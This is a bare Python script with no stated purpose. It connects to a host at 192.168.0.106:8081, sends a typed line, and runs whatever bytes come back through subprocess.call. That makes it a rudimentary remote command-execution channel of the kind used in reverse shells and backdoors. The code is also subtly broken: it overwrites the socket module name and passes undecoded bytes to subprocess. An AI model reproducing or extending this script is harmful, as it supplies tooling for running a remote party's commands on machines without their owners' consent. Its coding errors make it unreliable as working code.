import socket, subprocess

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect(("192.168.0.106", 8081))
command = input(">> ")
socket.send(command.encode())
data = socket.recv(1024)
subprocess.call(data)

socket.close()